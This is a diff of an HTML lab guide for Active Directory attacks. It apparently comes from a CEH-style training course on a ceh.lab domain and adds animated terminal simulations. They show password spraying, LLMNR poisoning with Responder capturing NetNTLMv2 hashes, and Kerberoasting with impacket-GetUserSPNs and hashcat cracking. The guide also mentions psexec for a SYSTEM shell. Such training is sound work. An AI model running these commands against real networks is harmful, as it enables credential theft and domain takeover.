+<span class="l crit">SMB  dc.ceh.lab  445  DC  [-] ceh.lab\a.hassan:Autumn2025!  STATUS_LOGON_FAILURE</span>
+<span class="l ok">SMB  dc.ceh.lab  445  DC  [+] ceh.lab\m.said:Autumn2025!</span>
+<span class="l crit">SMB  dc.ceh.lab  445  DC  [-] ceh.lab\svc_sql:Autumn2025!  STATUS_LOGON_FAILURE</span>
+<span class="l dim">one password · one try each account · stays under the lockout threshold</span>
+<span class="l ok">[+] 1 valid credential recovered → m.said</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">↻ Replay</button><span class="sim-note"><b>Spray, don't brute</b> — many passwords vs one account trips lockout.</span></div>
+</div>
 
       <div class="box attacker-view">
         <span class="box-t">Why spraying beats brute-force</span>
@@ -1517,38 +1566,39 @@ EOF</code></pre>
 
       <h2><span class="h-t">How it works — one picture</span></h2>
       <figure class="dgm">
-        <svg viewBox="0 0 940 330" role="img" aria-label="A victim's DNS lookup fails, it falls back to an LLMNR broadcast asking who owns a name, the attacker running Responder answers first claiming to be that host, the victim authenticates to the attacker and sends its NetNTLMv2 response, which the attacker captures and cracks offline.">
-          <!-- actors -->
-          <rect x="30" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#22d3ee"/>
-          <text class="d-title" x="105" y="64" text-anchor="middle" font-size="12.5">Victim (Win10)</text>
-          <text class="d-sub" x="105" y="82" text-anchor="middle">mistypes <tspan class="d-mono">\\fileshart</tspan></text>
-          <rect x="395" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#4ade80"/>
-          <text class="d-title" x="470" y="64" text-anchor="middle" font-size="12.5">DNS (the DC)</text>
-          <text class="d-sub" x="470" y="82" text-anchor="middle">has no such name</text>
-          <rect x="760" y="40" width="150" height="52" rx="8" fill="#1a1f2a" stroke="#ff7043"/>
-          <text class="d-title" x="835" y="64" text-anchor="middle" font-size="12" fill="#ff7043">Attacker (Responder)</text>
-          <text class="d-sub" x="835" y="82" text-anchor="middle">listening on the LAN</text>
-          <!-- step 1 -->
-          <path d="M182,64 L393,64" fill="none" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
-          <text class="d-sub" x="288" y="56" text-anchor="middle">1 · DNS lookup</text>
-          <path d="M393,86 L184,86" fill="none" stroke="#e63946" stroke-width="1.6" marker-end="url(#ar-r)"/>
-          <text class="d-sub" x="288" y="104" text-anchor="middle" fill="#e63946">NXDOMAIN — not found</text>
-          <!-- step 2 broadcast -->
-          <rect x="250" y="140" width="440" height="40" rx="8" fill="#1a1f2a" stroke="#fbbf24"/>
-          <text class="d-mono" x="470" y="165" text-anchor="middle" font-size="12" fill="#fbbf24">2 · LLMNR broadcast to the WHOLE segment: “who is fileshart?”</text>
-          <path d="M105,92 C105,150 200,160 248,160" fill="none" stroke="#fbbf24" stroke-width="1.6" marker-end="url(#ar-am)"/>
-          <!-- step 3 attacker answers -->
-          <path d="M690,160 C740,158 800,130 835,94" fill="none" stroke="#ff7043" stroke-width="1.8" marker-end="url(#ar-o)"/>
-          <text class="d-sub" x="700" y="140" fill="#ff7043">3 · “that's me!”</text>
-          <!-- step 4 auth -->
-          <path d="M180,72 C420,250 640,250 835,96" fill="none" stroke="#ff7043" stroke-width="2" stroke-dasharray="1 0" marker-end="url(#ar-o)"/>
-          <rect x="300" y="238" width="360" height="30" rx="6" fill="#0d1218" stroke="#ff7043"/>
-          <text class="d-mono" x="480" y="258" text-anchor="middle" font-size="11" fill="#ff7043">4 · victim authenticates → sends NetNTLMv2 response</text>
-          <!-- step 5 capture -->
-          <rect x="700" y="288" width="224" height="30" rx="6" fill="#1a1f2a" stroke="#e63946"/>
-          <text class="d-mono" x="812" y="308" text-anchor="middle" font-size="11" fill="#e63946">5 · captured → crack offline (-m 5600)</text>
-          <path d="M835,94 L835,286" fill="none" stroke="#e63946" stroke-width="1.4" marker-end="url(#ar-r)"/>
-        </svg>
+        <svg viewBox="0 0 1560 470" role="img" aria-label="LLMNR poisoning sequence: a victim DNS lookup fails, the victim broadcasts an LLMNR query, the attacker answers first, the victim authenticates to the attacker and its NetNTLMv2 is captured for offline cracking.">
+  <rect x="40" y="28" width="340" height="70" rx="9" fill="#1f2533" stroke="#22d3ee"></rect>
+  <text class="d-title" x="210" y="58" text-anchor="middle" font-size="18">Victim (Win10)</text>
+  <text class="d-lbl" x="210" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">mistypes <tspan class="d-mono">\\fileshart</tspan></text>
+  <rect x="610" y="28" width="340" height="70" rx="9" fill="#1f2533" stroke="#4ade80"></rect>
+  <text class="d-title" x="780" y="58" text-anchor="middle" font-size="18">DNS (the DC)</text>
+  <text class="d-lbl" x="780" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">has no such name</text>
+  <rect x="1180" y="28" width="340" height="70" rx="9" fill="#1a1f2a" stroke="#ff7043"></rect>
+  <text class="d-title" x="1350" y="58" text-anchor="middle" font-size="17" fill="#ff7043">Attacker (Responder)</text>
+  <text class="d-lbl" x="1350" y="82" text-anchor="middle" font-size="14" style="fill:var(--text-3)">listening on the LAN</text>
+  <line x1="210" y1="98" x2="210" y2="392" stroke="#333b4c" stroke-width="1.4"></line>
+  <line x1="780" y1="98" x2="780" y2="392" stroke="#333b4c" stroke-width="1.4"></line>
+  <line x1="1350" y1="98" x2="1350" y2="392" stroke="#333b4c" stroke-width="1.4"></line>
+  <!-- 1 -->
+  <text class="d-mono" x="495" y="142" text-anchor="middle" font-size="15" fill="#a0aab6">1 · DNS lookup: who is \\fileshart?</text>
+  <path class="flow-line" d="M214,154 L776,154" fill="none" stroke="#768290" stroke-width="1.7" marker-end="url(#ar-g)"></path>
+  <!-- 2 -->
+  <text class="d-mono" x="495" y="196" text-anchor="middle" font-size="15" fill="#e63946">2 · NXDOMAIN — not found</text>
+  <path class="flow-line" d="M776,208 L214,208" fill="none" stroke="#e63946" stroke-width="1.7" marker-end="url(#ar-r)"></path>
+  <!-- 3 broadcast -->
+  <text class="d-mono" x="780" y="250" text-anchor="middle" font-size="15" fill="#fbbf24">3 · LLMNR broadcast to the WHOLE segment: “who is fileshart?”</text>
+  <path class="flow-line" d="M214,262 L1346,262" fill="none" stroke="#fbbf24" stroke-width="1.7" marker-end="url(#ar-am)"></path>
+  <!-- 4 -->
+  <text class="d-mono" x="780" y="304" text-anchor="middle" font-size="15" fill="#ff7043">4 · “that's me!” — Responder answers first</text>
+  <path class="flow-line" d="M1346,316 L214,316" fill="none" stroke="#ff7043" stroke-width="1.8" marker-end="url(#ar-o)"></path>
+  <!-- 5 -->
+  <text class="d-mono" x="780" y="358" text-anchor="middle" font-size="15" fill="#ff7043">5 · victim authenticates → sends NetNTLMv2 response</text>
+  <path class="flow-line" d="M214,370 L1346,370" fill="none" stroke="#ff7043" stroke-width="2" marker-end="url(#ar-o)"></path>
+  <!-- 6 capture band -->
+  <path d="M1350,392 L1350,410" fill="none" stroke="#e63946" stroke-width="1.5" marker-end="url(#ar-r)"></path>
+  <rect x="1020" y="412" width="500" height="42" rx="8" fill="#1a1f2a" stroke="#e63946"></rect>
+  <text class="d-mono" x="1270" y="439" text-anchor="middle" font-size="15" fill="#e63946">6 · captured → crack offline (hashcat -m 5600)</text>
+</svg>
         <figcaption><b>Whoever answers first wins.</b> LLMNR/NBT-NS have no authentication — the victim believes the first
            reply. Responder's whole job is to be that reply, harvesting NetNTLMv2 responses from every workstation that
            mistypes a share or looks up a name that doesn't resolve.</figcaption>
@@ -1619,11 +1669,21 @@ EOF</code></pre>
           <strong>On the Win10 member</strong>, access a share name that doesn't resolve (a real user's typo).
           <pre><code># in Win10 Explorer or a cmd prompt:
 \\fileshart\data        # deliberately misspelled — DNS fails → LLMNR broadcast → Responder answers</code></pre>
-          <figure class="shot">
-            <img src="assets/img/responder-capture.jpg" alt="Responder terminal showing a captured SMB NTLMv2-SSP hash for a ceh.lab user">
-            <figcaption>Responder catching the fallback: an <span class="mono">[SMB] NTLMv2-SSP Hash</span> for a
-               <span class="mono">ceh.lab</span> account. <em>(Ships as a labelled placeholder until captured on a monitored domain.)</em></figcaption>
-          </figure>
+          <div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">Responder</span></div>
+  <div class="sim-body">
+<span class="l cmd root">responder -I eth0 -wv</span>
+<span class="l ok">  [+] Poisoners : LLMNR, NBT-NS, MDNS = ON</span>
+<span class="l ok">  [+] Servers   : SMB, HTTP = ON</span>
+<span class="l dim">  [+] Listening for events...</span>
+<span class="l warn">[*] [LLMNR]  Poisoned answer sent to 10.10.0.25  for name 'fileshart'</span>
+<span class="l info">[SMB] NTLMv2-SSP Client   : 10.10.0.25</span>
+<span class="l info">[SMB] NTLMv2-SSP Username : CEH\j.doe</span>
+<span class="l">[SMB] NTLMv2-SSP Hash     : <span class="hl">j.doe::CEH:1122334455...:A3F19C...</span></span>
+<span class="l ok">[*] saved → /usr/share/responder/logs/  → crack -m 5600</span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">↻ Replay</button><span class="sim-note"><b>Patient, not active</b> — you wait for a typo'd share, then capture.</span></div>
+</div>
           <div class="verify">
             <h4>✓ Verification</h4>
             <ul>
@@ -1755,10 +1815,19 @@ impacket-psexec       ceh.lab/m.said@192.168.56.20                    # SYSTEM s
 # MSSQLSvc/win10-tgt01.ceh.lab:1433  svc_backup   → $krb5tgs$23$*svc_backup*...
 # MSSQLSvc/win10-tgt01.ceh.lab:1434  svc_sql      → $krb5tgs$23$*svc_sql*...
 # save both hashes to spn.txt</code></pre>
-          <figure class="shot">
-            <img src="assets/img/getuserspns.jpg" alt="impacket-GetUserSPNs output listing service principal names and their krb5tgs Kerberoast hashes for svc_backup and svc_sql">
-            <figcaption><span class="mono">GetUserSPNs -request</span> returning the roastable tickets. <em>(Ships as a labelled placeholder until captured on a monitored domain.)</em></figcaption>
-          </figure>
+          <div class="sim" data-animate="">
+  <div class="sim-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="sim-title">kali@lab: ~</span><span class="sim-tool">impacket</span></div>
+  <div class="sim-body">
+<span class="l cmd root">impacket-GetUserSPNs ceh.lab/j.doe -request -dc-ip 10.10.0.10</span>
+<span class="l dim">ServicePrincipalName    Name     MemberOf</span>
+<span class="l dim">----------------------  -------  -------------------</span>
+<span class="l">MSSQL/dc.ceh.lab:1433   <b>svc_sql</b>  <span class="crit">Domain Admins</span></span>
+<span class="l dim">$krb5tgs$23$*svc_sql*CEH.LAB*...  ← TGS ticket hash</span>
+<span class="l cmd root">hashcat -m 13100 spns.txt rockyou.txt</span>
+<span class="l">svc_sql:<span class="hl">Summer2026!</span>   <span class="crit">← Domain Admin service account cracked</span></span><span class="sim-cursor"></span>
+  </div>
+  <div class="sim-cta"><button class="sim-replay" type="button">↻ Replay</button><span class="sim-note">Any domain user can request these tickets. <b>-m 13100</b>.</span></div>
+</div>
           <div class="verify">
             <h4>✓ Verification</h4>
             <ul>
